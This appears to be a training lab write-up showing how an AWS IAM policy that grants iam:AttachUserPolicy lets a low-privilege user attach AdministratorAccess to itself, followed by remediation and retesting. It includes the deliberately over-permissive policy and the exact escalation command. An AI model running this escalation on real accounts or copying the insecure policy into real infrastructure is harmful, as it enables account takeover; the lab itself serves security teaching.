# 🔐 Lab 5 – Cloud IAM Privilege Escalation Simulation

This lab demonstrates how an IAM misconfiguration in AWS can lead to privilege escalation and how it can be properly remediated using least privilege principles.

Environment:
- Cloud Provider: AWS
- Service: IAM
- Tool: AWS CLI (Windows PowerShell)
- User: lowpriv-user
- Custom Policy: EscalationPolicy

---

## Phase 1 – Misconfiguration

Created an IAM user (`lowpriv-user`) with programmatic access.

Attached a custom policy (`EscalationPolicy`) with overly permissive actions:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "iam:AttachUserPolicy",
        "iam:CreateAccessKey",
        "iam:ListUsers",
        "iam:ListPolicies"
      ],
      "Resource": "*"
    }
  ]
}
```

Critical issue:
- `iam:AttachUserPolicy` allowed the user to attach powerful AWS managed policies to themselves.
- This created a privilege escalation path.

---

## Phase 2 – Exploitation (Privilege Escalation)

Configured AWS CLI:

```
aws configure
```

Verified identity:

```
aws sts get-caller-identity
```

Escalated privileges:

```
aws iam attach-user-policy --user-name lowpriv-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

Verified admin access:

```
aws ec2 describe-instances
```

Result:
- Command executed successfully.
- User gained full administrative privileges.

Security Impact:
- Full AWS account takeover possible
- Infrastructure manipulation
- Data exposure
- Financial abuse risk

---

## Phase 3 – Remediation

Detached administrative policy:

```
aws iam detach-user-policy --user-name lowpriv-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

Modified custom policy to remove:
- `iam:AttachUserPolicy`
- `iam:CreateAccessKey`

Retested escalation attempt:

```
aws iam attach-user-policy --user-name lowpriv-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

Result:
- AccessDenied error
- Privilege escalation path removed

Additional Hardening:
- Enabled Multi-Factor Authentication (MFA)
- Applied least privilege principle

---

## Key Takeaways

- IAM misconfigurations can directly lead to privilege escalation.
- Policy management permissions must not be granted to low-privilege users.
- Always validate remediation by retesting.
- Enforce least privilege and enable MFA.

This lab demonstrates how improper IAM permissions can be exploited and how effective remediation restores secure cloud posture.
